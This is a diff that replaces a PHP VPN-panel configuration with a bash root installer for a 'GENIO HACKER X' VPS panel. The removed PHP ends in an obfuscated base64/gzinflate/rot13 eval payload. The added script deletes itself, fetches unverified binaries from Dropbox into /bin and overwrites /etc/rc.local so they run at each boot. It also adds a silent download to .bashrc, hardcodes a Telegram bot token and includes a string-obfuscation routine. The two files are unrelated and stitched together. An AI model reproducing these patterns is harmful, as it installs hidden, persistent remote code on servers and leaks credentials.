@@ -1,64 +1,601 @@
-<?php
+#!/bin/bash
+clear
+cd $HOME
+SCPdir="/etc/newadm"
+SCPinstal="$HOME/install"
+SCPidioma="${SCPdir}/idioma"
+SCPusr="${SCPdir}/ger-user"
+SCPfrm="/etc/ger-frm"
+SCPinst="/etc/ger-inst"
+#echo "nameserver 8.8.8.8" > /etc/resolv.conf
+#echo "nameserver 8.8.4.4" >> /etc/resolv.conf
+service apache2 restart > /dev/null 2>&1
+myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
+myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;
+mkdir -p /etc/B-ADMuser &>/dev/null
+rm $(pwd)/$0 &> /dev/null
+### COLORES Y BARRA 
+msg () {
+BRAN='\033[1;37m' && VERMELHO='\e[31m' && VERDE='\e[32m' && AMARELO='\e[33m'
+AZUL='\e[34m' && MAGENTA='\e[35m' && MAG='\033[1;36m' &&NEGRITO='\e[1m' && SEMCOR='\e[0m'
+ case $1 in
+  -ne)cor="${VERMELHO}${NEGRITO}" && echo -ne "${cor}${2}${SEMCOR}";;
+  -ama)cor="${AMARELO}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -verm)cor="${AMARELO}${NEGRITO}[!] ${VERMELHO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -azu)cor="${MAG}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -verd)cor="${VERDE}${NEGRITO}" && echo -e "${cor}${2}${SEMCOR}";;
+  -bra)cor="${VERMELHO}" && echo -ne "${cor}${2}${SEMCOR}";;
+  "-bar2"|"-bar")cor="${VERMELHO}————————————————————————————————————————————————————" && echo -e "${SEMCOR}${cor}${SEMCOR}";;
+ esac
+}
+### PAQUETES PRINCIPALES 
+msg -bar
+echo -e "\033[97m"
+echo -e "\033[41m -- INSTALAÇÃO DE PACOTES NECESARIOS PARA OGÊNIO HACKER X -- "
+echo -e "\033[100m  OLHE COM ATENÇÃO PARA SEGUINTE PERGUNTA"
+echo -e "\033[97m"
+msg -bar
+#grep
+apt-get install grep -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "grep"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install grep............ $ESTATUS "
+#net-tools
+apt-get install net-tools -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "net-tools"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "net-tools"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install net-tools....... $ESTATUS "
+#gawk
+apt-get install gawk -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "gawk"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install gawk............ $ESTATUS "
+#mlocate
+apt-get install mlocate -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "mlocate"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install mlocate......... $ESTATUS "
+#lolcat gem
+apt-get install lolcat -y &>/dev/null
+sudo gem install lolcat &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lolcat"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install lolcat.......... $ESTATUS "
+#at
+[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || apt-get install at -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "at"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install at.............. $ESTATUS "
+#nano
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || apt-get install nano -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "nano"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install nano............ $ESTATUS "
+#bc
+[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || apt-get install bc -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "bc"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install bc.............. $ESTATUS "
+#lsof
+[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || apt-get install lsof -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "lsof"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install lsof............ $ESTATUS "
+#figlet
+[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || apt-get install figlet -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "figlet"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install figlet.......... $ESTATUS "
+#cowsay
+[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || apt-get install cowsay -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "cowsay"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install cowsay.......... $ESTATUS "
+#screen
+[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || apt-get install screen -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "screen"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install screen.......... $ESTATUS "
+#python
+[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] || apt-get install python -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install python.......... $ESTATUS "
+#python3
+[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || apt-get install python3 -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install python3......... $ESTATUS "
+#python3-pip
+[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] || apt-get install python3-pip -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "python3-pip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install python3-pip..... $ESTATUS "
+#curl
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || apt-get install curl -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install curl............ $ESTATUS "
+#ufw
+[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || apt-get install ufw -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "ufw"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install ufw............. $ESTATUS "
+#unzip
+[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || apt-get install unzip -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "unzip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install unzip........... $ESTATUS "
+#zip
+[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || apt-get install zip -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "zip"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install zip............. $ESTATUS "
+#apache2
+[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || {
+ apt-get install apache2 -y &>/dev/null
+ sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf
+ service apache2 restart > /dev/null 2>&1 &
+ }
+[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || ESTATUS=`echo -e "\033[91mFALLO DE INSTALACION"` &>/dev/null
+[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] && ESTATUS=`echo -e "\033[92mINSTALADO"` &>/dev/null
+echo -e "\033[97m    # apt-get install apache2......... $ESTATUS "
+msg -bar2
+echo -e "\033[1;39m Preciona Enter Para continuar"
+clear
+### FIXEADOR PARA SISTEMAS 86_64
+idfix64_86 () {
+msg -bar2
+echo -e "ENCASO DE PEDIR ALGUNA INSTALACION ESCOJA: y "
+apt-get update; apt-get upgrade -y
+apt-get install curl -y
+apt-get install lsof -y
+apt-get install sudo -y
+apt-get install figlet -y
+apt-get install cowsay -y
+apt-get install bc -y
+apt-get install python -y
+apt-get install at
+apt install nethogs -y
+git clone https://github.com/ogenio/bashtop
+sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf
+service apache2 restart
+clear
+msg -bar2
+echo -e "ESCOJER PRIMERO #All locales# Y LUEGO #en_US.UTF-8# " 
+sleep 7s
+ export LANGUAGE=en_US.UTF-8\
+   && export LANG=en_US.UTF-8\
+   && export LC_ALL=en_US.UTF-8\
+   && export LC_CTYPE="en_US.UTF-8"\
+   && locale-gen en_US.UTF-8\
+   && sudo apt-get -y install language-pack-en-base\
+   && sudo dpkg-reconfigure locales
+clear
+}
+msg -bar2
+echo -e "\033[1;97m  APRECENTOU ERRO EM ALGUN PACOTE ANTERIOR?" 
+msg -bar2
+echo -e "\033[1;32m 1- Escolha:(N) Não. Para Instalar Normal"
+echo -e "\033[1;31m 2- Escolha:(S) Sim. Corrigir erro."
+msg -bar2
+echo -e "\033[1;39m Precione Enter para Continuar"
+msg -bar2
+read -p " [ S | N ]: " idfix64_86   
+[[ "$idfix64_86" = "s" || "$idfix64_86" = "S" ]] && idfix64_86
+clear
+fun_ip () {
+MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
+MIP2=$(wget -qO- ifconfig.me)
+[[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP"
+}  
+function_verify () {
+  ### INTALAR VERCION DE SCRIPT
+  v1=$(curl -sSL "https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/PROYECTOS_DESCONTINUADOS/master/GENERADOR-VPS-MX/Install/Vercion")
+  echo "$v1" > /etc/versin_script
+  [[ ! -e /usr/local/lib/lsystembin2 ]] && touch /usr/local/lib/lsystembin2
+ 
+}
+funcao_idioma () {
+msg -bar2
+figlet "    GENIO HACKER X" | lolcat 
+echo -e "     OBRIGADO POR USAR OGÊNIO HACKER X"
+msg -bar2
+echo -e "\033[01;34m▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣▣"
+pv="$(echo es)"
+[[ ${#id} -gt 2 ]] && id="es" || id="$pv"
+byinst="true"
+}
+install_fim () {
+msg -ama "               Finalizando Instalação" && msg bar2
+rm -rf /etc/newadm/ger-user/nombre.log &>/dev/null
+[[ $(find /etc/newadm/ger-user -name nombre.log|grep -w "nombre.log"|head -1) ]] || wget -O /etc/newadm/ger-user/nombre.log https://www.dropbox.com/s/pvo7zneayjjtsgw/nombre.log &>/dev/null
+[[ $(find /etc/newadm/ger-user -name IDT.log|grep -w "IDT.log"|head -1) ]] || wget -O /etc/newadm/ger-user/IDT.log https://www.dropbox.com/s/vzsacahfbwwm0ow/IDT.log &>/dev/null
+[[ $(find /etc/newadm/ger-user -name tiemlim.log|grep -w "tiemlim.log"|head -1) ]] || wget -O /etc/newadm/ger-user/tiemlim.log https://www.dropbox.com/s/kkchh0ldtdt2yza/tiemlim.log &>/dev/null
 
-/////////////////////////////
-/////////////////////////////
+wget -O /bin/rebootnb https://www.dropbox.com/s/4zsc3vfn5d9oi36/rebootnb &> /dev/null
+chmod +x /bin/rebootnb 
+wget -O /bin/resetsshdrop https://www.dropbox.com/s/244tj0ffe62hq4l/resetsshdrop &> /dev/null
+chmod +x /bin/resetsshdrop
+wget -O /etc/versin_script_new https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/PROYECTOS_DESCONTINUADOS/master/GENERADOR-VPS-MX/Install/Vercion &>/dev/null
+msg -bar2
+echo '#!/bin/sh -e' > /etc/rc.local
+sudo chmod +x /etc/rc.local
+echo "sudo rebootnb" >> /etc/rc.local
+echo "sudo resetsshdrop" >> /etc/rc.local
+echo "sleep 2s" >> /etc/rc.local
+echo "exit 0" >> /etc/rc.local
+/bin/cp /etc/skel/.bashrc ~/
+echo 'clear' >> .bashrc
+echo 'echo ""' >> .bashrc
+echo 'echo -e "\033[91m    " '>> .bashrc
+echo 'echo -e "\033[91m      " '>> .bashrc
+echo 'echo -e "\033[91m         " '>> .bashrc
+echo 'echo -e "\033[91m          " '>> .bashrc
+echo 'echo -e "\033[91m       " '>> .bashrc
+echo 'echo "" '>> .bashrc
+echo 'mess1="$(less /etc/newadm/message.txt)" ' >> .bashrc
+echo 'echo "" '>> .bashrc
+echo 'echo -e "\033[92m        RESELLER : $mess1 "'>> .bashrc
+echo 'echo "" '>> .bashrc                                               
+echo 'echo -e "\033[97m   PARA ENTRA NO PAINEL DIGITE:  sudo menu "'>> .bashrc
+echo 'wget -O /etc/versin_script_new https://www.dropbox.com/s/xi3kfu39eawuvoc/Vercion &>/dev/null'>> .bashrc
+echo 'echo ""'>> .bashrc
+echo -e "         COMANDO PRINCIPAL PARA ENTRAR NO PANEL "
+echo -e "\033[1;41m                     sudo menu                        \033[0;37m" && msg -bar2
+sleep 5
+exit
+}
+ofus () {
+unset server
+server=$(echo ${txt_ofuscatw}|cut -d':' -f1)
+unset txtofus
+number=$(expr length $1)
+for((i=1; i<$number+1; i++)); do
+txt[$i]=$(echo "$1" | cut -b $i)
+case ${txt[$i]} in
+".")txt[$i]="+";;
+"+")txt[$i]=".";;
+"1")txt[$i]="@";;
+"@")txt[$i]="1";;
+"2")txt[$i]="?";;
+"?")txt[$i]="2";;
+"4")txt[$i]="%";;
+"%")txt[$i]="4";;
+"-")txt[$i]="K";;
+"K")txt[$i]="-";;
+esac
+txtofus+="${txt[$i]}"
+done
+echo "$txtofus" | rev
+}
+verificar_arq () {
+[[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
+[[ ! -d ${SCPusr} ]] && mkdir ${SCPusr}
+[[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
+[[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
+case $1 in
+"menu"|"message.txt"|"menu.enc")ARQ="${SCPdir}/";; #Menu
+"usercodes")ARQ="${SCPusr}/";; #Panel SSRR
+"C-SSR.sh")ARQ="${SCPinst}/";; #Instalacao
+"openssh.sh")ARQ="${SCPinst}/";; #Instalacao
+"squid.sh")ARQ="${SCPinst}/";; #Instalacao
+"dropbear.sh")ARQ="${SCPinst}/";; #Instalacao
+"openvpn.sh")ARQ="${SCPinst}/";; #Instalacao
+"ssl.sh")ARQ="${SCPinst}/";; #Instalacao
+"shadowsocks.sh")ARQ="${SCPinst}/";; #Instalacao
+"Shadowsocks-libev.sh")ARQ="${SCPinst}/";; #Instalacao
+"Shadowsocks-R.sh")ARQ="${SCPinst}/";; #Instalacao 
+"v2ray.sh")ARQ="${SCPinst}/";; #Instalacao
+"budp.sh")ARQ="${SCPinst}/";; #Instalacao
+"sockspy.sh"|"PDirect.py"|"PPub.py"|"PPriv.py"|"POpen.py"|"PGet.py")ARQ="${SCPinst}/";; #Instalacao
+*)ARQ="${SCPfrm}/";; #Ferramentas
+esac
+mv -f ${SCPinstal}/$1 ${ARQ}/$1
+chmod +x ${ARQ}/$1
+}
 
-//FILL UP ALL VARIABLE [ $ ] | BASE TO YOUR DESIRE://
-$Nginx_Port= "85";	// Nginx Port
-$site_name        = "Project Fog";
-$site_description = "Premium Fast And Reliable Servers";
-$site_template    = "flatly"; // (flatly, darkly, sketchy, lumen, materia)
-$site_ovpnmonitoring = "http://137.184.130.0:89"; // Openvpn Monitoring
-$site_v2ray = "http://137.184.130.0:65432"; // v2ray ip and PORT
-$site_config = "http://137.184.130.0:85/projectfog.html"; // list of config
-$config_zips = "http://137.184.130.0:85/config.zip"; // ovpn zip check it on /home/vps/public_html
-$daily_limit_user = "50"; // set daily limit
+NOTIFY () {
+msg -bar
+msg -ama " Notify-BOT (Notificasion Remota)| VPS-MX By @Kalix1 "
+msg -bar
+echo -e "\033[1;94m Es una opcion para notificar cuando\n un usuario sea bloquedo o este expirado, e info de VPS."
+echo -e "\033[1;97m Deve usar el BOT de Telegram @Noti_VPSMX_Bot"
+echo -e "\033[1;92m Para sacar su ID solo Meta el comando /MENU en el BOT @USA1_BOT"
+echo -e "\033[1;92m Aparesera un pequeño menu donde aparesera su  👤 ID"
+msg -bar
+echo -e "\033[1;97mIgrese un nombre para el VPS:\033[0;37m"; read -p " " nombr
+echo "${nombr}" > /etc/newadm/ger-user/nombre.log
+echo -e "\033[1;97mIgrese su ID 👤:\033[0;37m"; read -p " " idbot
+echo "${idbot}" > /etc/newadm/ger-user/IDT.log 
+msg -bar
+echo -e "\033[1;32m         ID AGREGADO CON EXITO"
+msg -bar
+NOM="$(less /etc/newadm/ger-user/nombre.log)"
+NOM1="$(echo $NOM)"
+IDB1=`less /etc/newadm/ger-user/IDT.log` > /dev/null 2>&1
+IDB2=`echo $IDB1` > /dev/null 2>&1
 
-/////////////////////////////
-/////////////////////////////
+KEY="862633455:AAGJ9BBJanzV6yYwLSemNAZAVwn7EyjrtcY"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+MSG="⚠️ AVISO DE VPS: $NOM1 ⚠️
+👉 MENSAJE DE PRUEBA
+🔰 EXITOSO... SALUDOS"
+curl -s --max-time 10 -d "chat_id=$IDB2&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
 
-//Double Check if correct. Update anything not correct.
-$port_ssh= '22 | 299'; 		   	 // SSH Ports
-$port_dropbear= '790 | 2770';  	 // Dropbear Ports
-$port_ssl_dp= '446';                    	 // SSL through Dropbear
-$port_ssl_ssh= '444';                    	 // SSL through OpenSSH
-$port_ssl_ovpn= '445';                    	 // SSL through Openvpn
-$port_squid= '3233 | 7003 | 9005';  // Squid Ports
-$port_privoxy= '9880 | 9880'; 	 // Privoxy Ports
-$port_ohp_sq= '5595 | 5596';  		 // OHP through Squid
-$port_ohp_pr= '5597 | 5598';  		 // OHP through Privoxy
-$port_ohp_ov= '5599';  				 // OHP through Openvpn
-$port_psp_sim= '8033 | 22333';  		 // Python Simple Socks Proxy
-$port_psp_dir= '8044 | 22444';  		 // Python Direct Socks Proxy
-$port_psp_ov= '8055 | 22555';  		 // Python Openvpn Socks Proxy
-$config_fog = "config.zip";				 // Zip File Name for your OVPN Config /Default: config.zip
-
-
-/////////////////////////////  
-/////////////////////////////
-//  SHARPEN YOUR EYES!! READ PATTERN BELOW AND EDIT LINE 45,46,47,ETC
-/* Server Data */
-/* Variable = Server_Name, IP_Address, Root_Pass, Account_Validity */
-/* Sample: 1=>array(1=>"Name of your Server 1","your-ip-address","server-or-root-password","5"), */
-
-$server_lists_array=array(
-			1=>array(1=>"VIP Server","137.184.130.0","server-or-root-password","5"),
-			2=>array(1=>"Reserve 1 ","your-server-ip-2.here","server-or-root-password","5"),
-			3=>array(1=>"Reserve 2","your-server-ip-3.here","server-or-root-password","5"),
-	);			
-
-/////////////////////////////
-/////////////////////////////
-
-
-
-//////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////
-////////////// DONT EDIT CERTIFICATE BELOW  //////////////
-//////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////
-//////////////////////////////////////////////////////////
-//ySFq7OTEwsp50s/wCXAgtgZ6pmhjGxWCIhTvX+zKbtDg71kFXVGUxBRNazoHvzqoXQoxkSYA2VUmRUG1I0aA7RQXLYkz0JBBrUbhC8JtChjy4N8s7q3DD0d7JVmD49Dt9Pp1JdTp9NDPpLYBg0aDRf+O064kHoceRD9cDUAUm1P0yMALX/JYL+ihydUWgkrmLAWLqEQxSHUoAY260vP0eDsrJa1TjhDA+rO0NUWh6DIhGoPtshTFnFYT6OQIhHJVZSRNLJHhLhqth5YAc3XU8kSJ8nc8b3Eqnin81lpjJw21QSUUvewOEZ0AdUtGJH5ROwptXdgxqAQY587fafvrq0aCsVBBmxNLhm34mplAQKCYFsIkEqdJSwSNuMBcV+lG0txWBa40x+cE6d/5oI8l3JMKbeI6YBRKzkRjrnz6Y+Qk7mSoS/tM+cM0AeQuBWwQsBia6hIQ+x9Cpwow268hBZbI2+f2J2biQVLGvuwyE6QC1Ns7vzdDfO4HNxFw3BJlwNgZwDugpq6ck48MuW7Uk332BRSGXmhIwsuF7AI9ZfN7yA2bztYyoGYkXu0VSCkooh4e7I6q70gwEU6yrVxmhiKPKnP4nhQR6cqmbbMFHOVQ29baxA/3EnVH+Q6kWs2xX6Z9hSoWvsF2IXBv1JVKXGb+uQoIMg4KUqhprFxcMmKeyMrwkzGfKgvim5TErlb/lqLuNQSYWuOQkEBDxHMlmye4KxF01OjXcHjkaWLFz2asYVcIZpOOlYk6uhVBTowtMPXTFBTApDI+epswEgsqlUop0S6fjUtEbcDBf4weHWUoZUTG21xjGV3n8p/TG+fALFc4ga1DT7IEYMcP+XNuLJyMihwd81ka
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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